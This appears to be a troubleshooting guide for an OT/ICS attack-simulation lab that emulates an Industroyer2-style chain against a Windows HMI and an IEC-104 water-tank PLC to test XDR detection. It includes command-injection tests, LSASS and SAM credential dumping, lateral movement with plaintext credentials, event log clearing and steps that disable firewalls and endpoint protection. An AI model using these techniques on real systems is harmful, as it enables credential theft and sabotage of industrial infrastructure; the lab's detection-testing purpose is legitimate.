# mrhOTshOT Troubleshooting Guide

> **Common issues and their solutions**

This guide covers common problems you might encounter and how to fix them.

## Table of Contents

1. [Network Connectivity Issues](#network-connectivity-issues)
2. [Service Startup Problems](#service-startup-problems)
3. [Attack Execution Failures](#attack-execution-failures)
4. [Windows/HMI Specific Issues](#windowshmi-specific-issues)
5. [Linux Specific Issues](#linux-specific-issues)
6. [Security Product Integration](#security-product-integration)
7. [Performance and Timeout Issues](#performance-and-timeout-issues)

---

## Network Connectivity Issues

### Problem: Cannot ping HMI from Attacker

**Symptoms**:
```bash
$ ping 192.168.1.55
PING 192.168.1.55 (192.168.1.55) 56(84) bytes of data.
^C
--- 192.168.1.55 ping statistics ---
5 packets transmitted, 0 received, 100% packet loss
```

**Diagnosis**:
```bash
# Step 1: Can you reach the router?
ping 192.168.0.13
# If NO: Check attacker's network configuration

# Step 2: Can the router reach HMI?
ssh admin@192.168.0.13
ping 192.168.1.55
# If NO: Check HMI's network configuration

# Step 3: Is IP forwarding enabled on router?
ssh admin@192.168.0.13
sysctl net.ipv4.ip_forward
# Should show: net.ipv4.ip_forward = 1
```

**Solution**:

On Router:
```bash
# Enable IP forwarding
sudo sysctl -w net.ipv4.ip_forward=1

# Make it permanent
echo "net.ipv4.ip_forward=1" | sudo tee -a /etc/sysctl.conf

# Add iptables rules
sudo iptables -A FORWARD -i eth0 -o eth1 -j ACCEPT
sudo iptables -A FORWARD -i eth1 -o eth0 -j ACCEPT

# Save iptables rules
sudo apt-get install iptables-persistent
sudo netfilter-persistent save
```

On HMI (Windows):
```powershell
# Check firewall
Get-NetFirewallProfile | Select Name, Enabled

# Temporarily disable for testing
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False

# Re-enable after testing
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled True
```

---

### Problem: "No route to host" Error

**Symptoms**:
```
connect: No route to host
```

**Diagnosis**:
```bash
# Check routing table on attacker
ip route show

# Check if router has correct routes
ssh admin@192.168.0.13
ip route show
```

**Solution**:

On Attacker:
```bash
# Add route to OT network via router
sudo ip route add 192.168.1.0/24 via 192.168.0.13
```

On Router:
```bash
# Verify interfaces have correct IPs
ip addr show eth0  # Should have 192.168.0.13
ip addr show eth1  # Should have 192.168.1.4
```

---

### Problem: Windows Firewall Blocking Connections

**Symptoms**:
- Can ping HMI
- Cannot connect to SMB (port 445)
- Cannot connect to RDP (port 3389)

**Diagnosis**:
```powershell
# On HMI, check firewall rules
Get-NetFirewallRule | Where-Object {$_.Enabled -eq 'True'} | Select DisplayName, Direction, Action

# Check if specific ports are allowed
Test-NetConnection -ComputerName localhost -Port 445
Test-NetConnection -ComputerName localhost -Port 3389
Test-NetConnection -ComputerName localhost -Port 5985
```

**Solution**:

```powershell
# Open PowerShell as Administrator on HMI

# Allow SMB (File Sharing)
Enable-NetFirewallRule -DisplayGroup "File and Printer Sharing"

# Allow RDP
Enable-NetFirewallRule -DisplayGroup "Remote Desktop"

# Allow WinRM
Enable-NetFirewallRule -DisplayGroup "Windows Remote Management"

# Or temporarily disable firewall for testing
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False

# Verify
Get-NetFirewallProfile | Select Name, Enabled
```

---

## Service Startup Problems

### Problem: PLC Server Won't Start

**Symptoms**:
```bash
$ ./start_plc.sh
Starting Water Tank IEC-104 Server
Traceback (most recent call last):
  File "iec104_server.py", line 5, in <module>
    import c104
ModuleNotFoundError: No module named 'c104'
```

**Diagnosis**:
```bash
# Check if c104 is installed
python3 -c "import c104"

# Check Python version
python3 --version

# Check pip packages
pip3 list | grep c104
```

**Solution**:

```bash
# Reinstall c104 library
cd ~/mrhOTshOT/libs/c104-2.2.1
pip3 install .

# If build fails, install dependencies
sudo apt-get update
sudo apt-get install -y build-essential cmake python3-dev

# Try again
pip3 install .

# Verify
python3 -c "import c104; print(c104.__version__)"
```

---

### Problem: Router Web Server Port Already in Use

**Symptoms**:
```bash
$ ./start_router.sh
Starting Vulnerable Router Web Server
OSError: [Errno 98] Address already in use
```

**Diagnosis**:
```bash
# Check what's using port 8080
sudo netstat -tulpn | grep 8080

# Or with ss
sudo ss -tulpn | grep 8080
```

**Solution**:

```bash
# Option 1: Kill existing process
sudo kill -9 <PID_from_netstat>

# Option 2: Use different port
cd ~/mrhOTshOT/machines/router
# Edit vulnerable_router_server.py, change port to 8081
python3 vulnerable_router_server.py --port 8081

# Update attacker scripts to use new port
cd ~/mrhOTshOT/machines/attacker/scripts
# Edit MASTER_ATTACK_ORCHESTRATOR.py, change ROUTER_PORT to 8081
```

---

### Problem: PLC Port 2404 Already in Use

**Symptoms**:
```
OSError: [Errno 98] Address already in use (port 2404)
```

**Diagnosis**:
```bash
sudo netstat -tulpn | grep 2404
```

**Solution**:
```bash
# Kill existing process
sudo kill -9 <PID>

# Or restart systemd service
sudo systemctl restart water-tank

# Check status
sudo systemctl status water-tank
```

---

## Attack Execution Failures

### Problem: Phase 1 - Router Exploit Fails

**Symptoms**:
```
[-] Router exploit failed
[-] Cannot reach http://192.168.0.13:8080
```

**Diagnosis**:
```bash
# Test router web server manually
curl http://192.168.0.13:8080

# Test command injection
curl -X POST http://192.168.0.13:8080/execute -d "command=whoami"

# Check router logs
ssh admin@192.168.0.13
tail -f /var/log/vulnerable-router/access.log
```

**Solution**:

On Router:
```bash
# Ensure web server is running
cd ~/mrhOTshOT/machines/router
python3 vulnerable_router_server.py

# Or start as service
sudo systemctl start vulnerable-router
sudo systemctl status vulnerable-router
```

If still failing:
```bash
# Check Flask is installed
python3 -c "import flask"

# Reinstall if needed
pip3 install flask
```

---

### Problem: Phase 2 - Enumeration Fails (nmap not found)

**Symptoms**:
```
[-] nmap command not found
```

**Solution**:

On Router:
```bash
# Install nmap
sudo apt-get update
sudo apt-get install -y nmap

# Verify
nmap --version
```

---

### Problem: Phase 3 - Credential Dumping Fails

**Symptoms**:
```
[-] LSASS dump failed or file too small
[-] Access denied
```

**Diagnosis**:

On HMI:
```powershell
# Check if running as Administrator
[Security.Principal.WindowsIdentity]::GetCurrent() | Select Name
whoami /groups | findstr /i "S-1-16-12288"
# Should show "Mandatory Label\High Mandatory Level"

# Check if LSASS process exists
Get-Process lsass
```

**Solution**:

```powershell
# MUST run PowerShell as Administrator
# Right-click PowerShell → "Run as Administrator"

# Then execute dumper
cd C:\Temp
python 05_credential_dumper.py --dump-lsass --dump-registry
```

If still failing:
```powershell
# Check if Cortex XDR is blocking
# Temporarily disable XDR for testing (NOT recommended in production)

# Or whitelist the script
# Add exception in Cortex XDR console for:
# - rundll32.exe comsvcs.dll MiniDump
# - reg.exe save HKLM\SAM
```

---

### Problem: Phase 4 - Lateral Movement Authentication Fails

**Symptoms**:
```
[-] SMB authentication failed
[-] Logon failure: unknown user name or bad password
```

**Diagnosis**:

On HMI:
```powershell
# Check if user exists
Get-LocalUser operator

# Check if user is in Administrators group
Get-LocalGroupMember -Group "Administrators"
```

**Solution**:

On HMI:
```powershell
# Create user if missing
$password = ConvertTo-SecureString "labpass123" -AsPlainText -Force
New-LocalUser -Name "operator" -Password $password -PasswordNeverExpires

# Add to Administrators
Add-LocalGroupMember -Group "Administrators" -Member "operator"

# Verify
Get-LocalUser operator
Get-LocalGroupMember -Group "Administrators"
```

Check Network Level Authentication:
```powershell
# Disable NLA for testing
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' `
    -Name "UserAuthentication" -Value 0

# Restart Terminal Services
Restart-Service TermService
```

---

### Problem: Phase 5 - File Transfer Fails (All Methods)

**Symptoms**:
```
[-] SMB transfer failed
[-] HTTP transfer failed
[-] PowerShell transfer failed
[-] RDP transfer failed
```

**Diagnosis**:

**For SMB**:
```bash
# Test SMB connectivity
smbclient -L //192.168.1.55 -U operator%labpass123

# Test file copy
echo "test" > /tmp/test.txt
smbclient //192.168.1.55/C$ -U operator%labpass123 -c "put /tmp/test.txt Temp\test.txt"
```

**For HTTP**:
```bash
# On attacker, start HTTP server
cd ~/mrhOTshOT/machines/attacker/scripts
python3 -m http.server 8000

# On HMI, test download
curl http://192.168.0.11:8000/
```

**For PowerShell**:
```powershell
# On HMI, test PowerShell execution
powershell.exe -Command "Write-Host 'Test'"

# Check execution policy
Get-ExecutionPolicy

# Set to unrestricted for testing
Set-ExecutionPolicy Unrestricted -Scope CurrentUser
```

**For RDP**:
```bash
# Check if xfreerdp is installed
which xfreerdp

# Install if missing
sudo apt-get install freerdp2-x11

# Test RDP connection
xfreerdp /v:192.168.1.55 /u:operator /p:labpass123 /cert:ignore
```

---

### Problem: Phase 6 - Industroyer2 Characteristics Fails

**Symptoms**:
```
[-] Cannot terminate processes - Access denied
[-] Event log clearing failed - Access denied
```

**Solution**:

**MUST run as SYSTEM or Administrator**:

```powershell
# On HMI, verify running as admin
whoami
# Should show: hmi\operator or similar with admin rights

# If not admin, use PsExec to run as SYSTEM
C:\Temp\PsExec.exe -accepteula -s python.exe C:\Temp\industroyer2_characteristics.py
```

If Cortex XDR is blocking:
```
# Add exception in XDR console for:
# - Process termination of SCADA processes
# - Event log clearing (wevtutil.exe)
# - File deletion operations
```

---

### Problem: Phase 7 - IEC-104 Connection Fails

**Symptoms**:
```
[-] Cannot connect to PLC at 192.168.1.6:2404
ConnectionRefusedError: [Errno 111] Connection refused
```

**Diagnosis**:

```bash
# From HMI or Attacker
telnet 192.168.1.6 2404

# Check if PLC server is running
ssh user@192.168.1.6
netstat -ln | grep 2404
ps aux | grep iec104_server
```

**Solution**:

On PLC:
```bash
# Start IEC-104 server
cd ~/mrhOTshOT/execution
./start_plc.sh

# Or as systemd service
sudo systemctl start water-tank
sudo systemctl status water-tank

# Check logs
tail -f /var/log/water-tank/iec104_server.log
```

If server is running but connection fails:
```bash
# Check firewall on PLC
sudo ufw status
sudo ufw allow 2404/tcp

# Or disable firewall for testing
sudo ufw disable
```

---

## Windows/HMI Specific Issues

### Problem: Python Not Found on Windows

**Symptoms**:
```powershell
PS C:\> python
'python' is not recognized as an internal or external command
```

**Solution**:

```powershell
# Check if Python is installed
where python
where python3

# If not found, install Python
# Download from: https://www.python.org/downloads/
# [+] IMPORTANT: Check "Add Python to PATH" during installation

# After installation, restart PowerShell
# Verify
python --version
```

If Python is installed but not in PATH:
```powershell
# Add to PATH manually
$env:Path += ";C:\Users\operator\AppData\Local\Programs\Python\Python311"

# Make permanent
[Environment]::SetEnvironmentVariable("Path", $env:Path, [System.EnvironmentVariableTarget]::User)
```

---

### Problem: WinRM Not Enabled

**Symptoms**:
```
[-] WinRM connection failed
```

**Diagnosis**:
```powershell
# Check WinRM status
Get-Service WinRM

# Check WinRM configuration
winrm get winrm/config
```

**Solution**:
```powershell
# Enable WinRM
Enable-PSRemoting -Force -SkipNetworkProfileCheck

# Configure for unencrypted traffic (lab only!)
Set-Item WSMan:\localhost\Service\AllowUnencrypted -Value $true
Set-Item WSMan:\localhost\Service\Auth\Basic -Value $true

# Allow remote access
Set-Item WSMan:\localhost\Client\TrustedHosts -Value "*" -Force

# Restart WinRM
Restart-Service WinRM

# Verify
Test-WSMan -ComputerName localhost
```

---

### Problem: SMB Shares Not Accessible

**Symptoms**:
```
[-] Cannot access \\192.168.1.55\C$
[-] Access denied
```

**Solution**:

On HMI:
```powershell
# Enable File and Printer Sharing
Enable-NetFirewallRule -DisplayGroup "File and Printer Sharing"

# Verify admin shares are enabled
reg query "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /v AutoShareWks
# Should be 1

# If not, enable it
reg add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /v AutoShareWks /t REG_DWORD /d 1 /f

# Restart Server service
Restart-Service LanmanServer
```

---

### Problem: RDP Not Working

**Symptoms**:
```
[-] RDP connection refused
```

**Diagnosis**:
```powershell
# Check if RDP is enabled
Get-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections"
# Should be 0
```

**Solution**:
```powershell
# Enable RDP
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0

# Enable firewall rule
Enable-NetFirewallRule -DisplayGroup "Remote Desktop"

# Restart Terminal Services
Restart-Service TermService

# Verify
Get-NetTCPConnection | Where-Object LocalPort -eq 3389
```

---

## Linux Specific Issues

### Problem: Permission Denied Errors

**Symptoms**:
```bash
$ ./setup.sh
bash: ./setup.sh: Permission denied
```

**Solution**:
```bash
# Make script executable
chmod +x setup.sh

# Then run
./setup.sh
```

If still getting permission denied:
```bash
# Run with sudo
sudo ./setup.sh

# Or run with bash
bash setup.sh
```

---

### Problem: "sudo: command not found"

**Symptoms**:
```bash
$ sudo apt-get update
bash: sudo: command not found
```

**Solution**:
```bash
# You're already root, just run command without sudo
apt-get update

# Or switch to root
su -
# Then run commands without sudo
```

---

### Problem: pip3 Install Fails - Build Error

**Symptoms**:
```bash
$ pip3 install c104
error: command 'gcc' failed
```

**Solution**:
```bash
# Install build dependencies
sudo apt-get update
sudo apt-get install -y build-essential cmake python3-dev

# Try again
pip3 install ~/mrhOTshOT/libs/c104-2.2.1
```

---

### Problem: impacket-psexec Not Found

**Symptoms**:
```bash
$ impacket-psexec --help
bash: impacket-psexec: command not found
```

**Solution**:
```bash
# Option 1: Install from repository
sudo apt-get install python3-impacket

# Option 2: Install from pip
pip3 install impacket

# Option 3: Install from GitHub
git clone https://github.com/fortra/impacket.git
cd impacket
pip3 install .
python3 setup.py install

# Verify
which impacket-psexec
impacket-psexec --help
```

---

## Security Product Integration

### Problem: Cortex XDR Blocks Attack Scripts

**Symptoms**:
- Scripts are deleted immediately after creation
- Execution fails with "Access denied"
- XDR alerts show "Prevented" instead of "Detected"

**Solution**:

In Cortex XDR Console:
1. Go to **Response → Action Center**
2. Create exception for lab environment:
   - Exception Type: Process Execution
   - Process: `python.exe`, `pythonw.exe`, `rundll32.exe`, `reg.exe`, `wevtutil.exe`
   - Path: `C:\Temp\*`
   - Action: Allow
   - Scope: HMI machine only

**Better approach** (for realistic testing):
- Keep XDR in **Monitor Only** mode
- This generates alerts without blocking
- More realistic for testing detection capabilities

---

### Problem: WildFire Not Receiving Files

**Symptoms**:
- No files appearing in WildFire Analysis
- Verdict shows "Unknown"

**Diagnosis**:

Check in XSIAM/Panorama:
1. Go to **Monitor → WildFire Submissions**
2. Verify submissions are occurring
3. Check file size (files > 100MB won't be submitted)

**Solution**:

Ensure Device Security is configured:
1. **Policies → Security Profiles → Antivirus**
   - Enable WildFire file forwarding
   - Set to "All files"

2. **Device Management → WildFire**
   - Verify license is active
   - Check connectivity to cloud

---

### Problem: XSIAM Not Showing Attack Chain

**Symptoms**:
- Individual alerts appear
- No correlated incident created
- Attack chain not visible

**Solution**:

1. **Verify log collection**:
   - Go to **Settings → Data Sources**
   - Check HMI, Router, PLC are sending logs
   - Verify Cortex XDR agent is connected

2. **Check correlation rules**:
   - Go to **Response → Rules**
   - Import `CUSTOM_DETECTION_RULES.md` BIOC rules
   - Ensure rules are enabled

3. **Wait for correlation**:
   - XSIAM correlation can take 5-15 minutes
   - Check **Incidents** tab after waiting

---

## Performance and Timeout Issues

### Problem: Attack Times Out at Phase 5

**Symptoms**:
```
[*] Transferring files via SMB...
[*] Timeout after 120 seconds
```

**Solution**:

Increase timeouts:
```bash
# Edit MASTER_ATTACK_ORCHESTRATOR.py
# Find: timeout=120
# Change to: timeout=300

# Or use command line option
python3 MASTER_ATTACK_ORCHESTRATOR.py --timeout 300
```

Optimize network:
```bash
# Reduce network latency
# On all machines, check MTU
ip link show | grep mtu

# Set optimal MTU if needed
sudo ip link set eth0 mtu 1500
```

---

### Problem: LSASS Dump Takes Too Long

**Symptoms**:
```
[*] Dumping LSASS memory...
[*] Still dumping... (5 minutes elapsed)
```

**Solution**:

```powershell
# Use faster dump method (on HMI)
# Instead of full dump, use mini dump

# Edit 05_credential_dumper.py
# Change: MiniDump ... full
# To: MiniDump ... mini

# Or increase timeout in script
```

---

### Problem: Slow File Transfers

**Symptoms**:
- SMB transfer takes > 5 minutes for small files
- HTTP download fails due to timeout

**Diagnosis**:
```bash
# Test network speed between attacker and HMI
# On attacker
iperf3 -s

# On HMI
iperf3 -c 192.168.0.11
```

**Solution**:

1. **Use faster transfer method**:
   ```bash
   # PowerShell in-memory is fastest
   python3 06_file_transfer_all_methods.py --method powershell
   ```

2. **Compress payload**:
   ```bash
   # Payload.zip is already compressed
   # Ensure it's not being decompressed/recompressed
   ```

3. **Check network issues**:
   ```bash
   # Verify no packet loss
   ping -c 100 192.168.1.55 | grep "packet loss"
   # Should show 0% loss
   ```

---

## Emergency Procedures

### Kill All Running Attacks

```bash
# On Attacker
pkill -f MASTER_ATTACK_ORCHESTRATOR
pkill -f phishing_server
pkill -f http.server

# On Router
sudo systemctl stop vulnerable-router
pkill -f vulnerable_router_server

# On HMI (PowerShell as Admin)
Stop-Process -Name python* -Force

# On PLC
sudo systemctl stop water-tank
pkill -f iec104_server
```

---

### Reset Water Tank to Safe State

```bash
# On PLC
ssh user@192.168.1.6

# Stop server
sudo systemctl stop water-tank

# Reset state file
rm -f /var/lib/water-tank/state.json

# Restart with clean state
sudo systemctl start water-tank
```

---

### Restore Event Logs (if cleared)

```powershell
# On HMI
# Event logs cannot be restored once cleared
# But you can re-enable logging

# Restart Event Log service
Restart-Service EventLog

# Verify
Get-EventLog -List
```

---

## Getting More Help

### Enable Debug Logging

```bash
# In any Python script, add:
import logging
logging.basicConfig(level=logging.DEBUG)

# Or run with verbose flag
python3 MASTER_ATTACK_ORCHESTRATOR.py --log-level DEBUG
```

### Collect Diagnostic Information

```bash
# On Attacker
cd ~/mrhOTshOT
./collect_diagnostics.sh

# Creates: diagnostics_YYYYMMDD_HHMMSS.tar.gz
# Contains: logs, configs, network status, process lists
```

### Check System Resources

```bash
# On any Linux machine
htop

# Or
free -h
df -h
iostat
```

```powershell
# On Windows HMI
Get-Process | Sort-Object CPU -Descending | Select -First 10
Get-Counter '\Memory\Available MBytes'
Get-PSDrive C | Select Used, Free
```

---

## Additional Resources

- **Setup Issues**: [SETUP_GUIDE.md](SETUP_GUIDE.md)
- **Execution Questions**: [EXECUTION_GUIDE.md](EXECUTION_GUIDE.md)
- **Network Problems**: [NETWORK_TOPOLOGY.md](../NETWORK_TOPOLOGY.md)
- **Detection Rules**: [CUSTOM_DETECTION_RULES.md](../CUSTOM_DETECTION_RULES.md)

---

**Still stuck?**

1. Check logs in `/tmp/mrhOTshOT/logs/` (Linux) or `C:\Logs\mrhOTshOT\` (Windows)
2. Review recent changes to configuration
3. Verify all prerequisites are installed
4. Try running individual phases to isolate the problem
5. Check security product policies aren't blocking operations
